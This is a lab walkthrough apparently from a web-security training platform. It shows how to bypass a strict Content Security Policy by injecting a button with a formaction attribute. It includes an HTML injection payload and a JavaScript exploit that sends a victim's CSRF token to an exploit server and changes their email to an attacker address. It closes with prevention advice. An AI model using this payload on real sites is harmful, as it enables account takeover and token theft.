# Lab 29: Reflected XSS protected by very strict CSP, with dangling markup attack

**Goal**: Bypass a strict Content Security Policy (CSP) that blocks inline scripts using a Dangling Markup / Form Hijacking attack to exfiltrate the victim's CSRF token and update their email to `hacker@evil-user.net`.

This lab implements a strict CSP (`default-src 'self'`) blocking standard XSS scripts and inline script tags. However, the CSP does not restrict the `formaction` attribute on submit buttons. We inject a `<button formaction="...">` element to hijack form submissions and exfiltrate the victim's CSRF token to our Exploit Server via a GET request.

---

## 🎯 Solution

1. Log in using test credentials (`wiener:peter`) to inspect `/my-account`.
2. Observe that reflected XSS payloads (`<img src onerror=alert(1)>`) are blocked by CSP.
3. Test injecting a `<button>` with a custom `formaction` pointing to your Exploit Server URL:
   ```http
   /my-account?email=foo@bar"><button formaction="https://<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net/exploit" formmethod="get">Click me</button>
   ```
4. Verify that clicking the injected button sends a GET request to the Exploit Server containing the victim's CSRF token in the URL query string.
5. In the Exploit Server, save an automated script that extracts the victim's CSRF token and submits the email change form to `hacker@evil-user.net`.
6. Click **Deliver exploit to victim** to solve the lab.

![Lab 29 Dangling Markup Exploit Delivery](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926233141.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Log In & Inspect Account Email Form
Log in with credentials `wiener:peter`. Inspect the email update form at `/my-account`:

![Lab 29 My Account Form](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926224829.png)

Attempting standard script injection in `/my-account?email=...` is blocked by the strict CSP header:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Step 2: Inject HTML Button with `formaction` & `formmethod="get"`
Because CSP does not restrict the `formaction` or `formmethod` attributes on HTML `<button>` elements, we can override the form target!

Construct the injection payload:

```html
foo@bar"><button formaction="https://<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net/exploit" formmethod="get">Click me</button>
```

When rendered, the form HTML expands to:

```html
<form action="/my-account/change-email" method="POST">
    <input type="hidden" name="csrf" value="CSRF-TOKEN-HERE">
    <input type="email" name="email" value="foo@bar">
    <button formaction="https://<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net/exploit" formmethod="get">Click me</button>
...
```

Clicking **Click me** forces the browser to send a GET request containing all form fields (including `csrf=...`) to the Exploit Server URL!

![Lab 29 Form Hijacking Test Button](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926230857.png)

### Step 3: Automate CSRF Exfiltration & Email Change via Exploit Server
In the **Exploit Server** Body field, enter the following automated JavaScript payload:

```html
<body>
<script>
const academyFrontend = "https://<YOUR-LAB-ID>.web-security-academy.net/";
const exploitServer = "https://<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net/exploit";

const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;

    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

#### Exploit Server Workflow:
1. When the victim bot opens the Exploit Server URL, `location` redirects them to the lab `/my-account` page with the injected button.
2. The bot clicks the button, sending a GET request containing their valid `csrf` token back to the Exploit Server.
3. The Exploit Server receives the `csrf` parameter, creates an automated form dynamically, and posts `email=hacker@evil-user.net` + `csrf=<stolen_csrf_token>`.

### Step 4: Deliver to Victim
1. Click **Store**.
2. Click **Deliver exploit to victim**.

![Lab 29 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926233141.png)

> [!SUCCESS]
> **Lab Solved**: Successfully bypassed CSP via `formaction` form hijacking to exfiltrate the victim's CSRF token and update their email address!

---

## 💡 Key Takeaways: Dangling Markup & Form Hijacking

- **CSP Gaps**: CSP policies focusing solely on `script-src` fail to prevent HTML injection attacks that manipulate HTML form destinations (`formaction`, `action`) or load external media (`<img src="...">`).
- **`formaction` Override**: Setting `formaction` on a submit button overrides the parent `<form action="...">` target, redirecting sensitive form data to attacker-controlled origins.

---

## 🔒 Prevention

> [!TIP]
> 1. **Restrict `form-action` Directive in CSP**: Include `form-action 'self'` in your Content Security Policy to prevent forms from submitting data to untrusted external domains.
> 2. **HTML Entity Encoding**: Encode quotes (`"`, `'`) and angle brackets (`<`, `>`) in all input parameter values reflected inside form attributes.
